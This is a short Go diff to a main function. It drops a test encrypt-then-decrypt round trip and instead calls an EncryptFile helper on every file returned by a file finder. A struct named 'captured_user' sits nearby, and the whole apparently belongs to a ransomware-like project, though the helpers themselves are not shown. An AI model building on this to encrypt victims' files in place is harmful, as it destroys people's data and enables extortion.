@@ -13,10 +13,8 @@ type captured_user struct {
 func main() {
 	var files = encryptutils.Findfiles()
 	for _, file := range files {
-		data := encryptutils.Encrypt(file)
-		fmt.Println(data)
-		decryptedData := encryptutils.Decryptkey(data)
-		fmt.Println(decryptedData)
+		fmt.Println(file)
+		encryptutils.EncryptFile(file)
 	}
 }
 
